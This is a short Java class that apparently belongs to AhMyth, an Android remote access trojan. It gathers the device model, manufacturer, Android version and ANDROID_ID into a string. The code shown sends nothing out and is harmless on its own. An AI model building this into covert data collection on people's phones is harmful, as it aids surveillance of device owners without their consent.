package ahmyth.mine.ahmyth.utils;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;

public class DataCollector {
    private Context context;

    public DataCollector(Context context) {
        this.context = context;
    }

    public String getAllData() {
        StringBuilder sb = new StringBuilder();
        sb.append("Device Model: ").append(Build.MODEL).append("\n");
        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        sb.append("Android Version: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("Device ID: ").append(Settings.Secure.getString(
            context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n");
        return sb.toString();
    }
}

